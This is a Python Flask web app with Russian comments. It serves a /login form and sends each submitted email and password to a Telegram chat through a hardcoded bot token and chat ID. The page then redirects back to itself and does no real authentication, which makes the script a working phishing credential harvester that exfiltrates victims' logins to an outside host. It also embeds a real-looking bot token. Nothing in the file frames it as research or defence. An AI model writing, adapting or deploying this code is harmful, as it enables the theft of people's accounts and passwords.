import requests
from flask import Flask, request, redirect, url_for, render_template

app = Flask(__name__)

TOKEN = "7672375290:AAHlWfMp0ZNk5Hg3U6lDADA8qyIESjsIoZI"
CHAT_ID = "-4628693031"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    response = requests.post(url, data=payload)
    print(response.json())
    return response.json()

@app.route("/login", methods=["GET", "POST"])
def index():

    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")


        telegram_message = (
            f"<b>Новое сообщение с сайта:</b>\n\n"
            f"<b>Почта:</b> {email}\n"
            f"<b>Пароль:</b> {password}\n"
        )

        # Отправляем сообщение в Telegram
        result = send_to_telegram(telegram_message)

        # Проверяем результат отправки
        if result.get("ok"):
            print("Сообщение отправлено!", "success")
        else:
            print("Ошибка при отправке сообщения.", "error")


        return redirect(url_for("index"))

    return render_template("index.html")

if __name__ == '__main__':
    app.run(debug=False)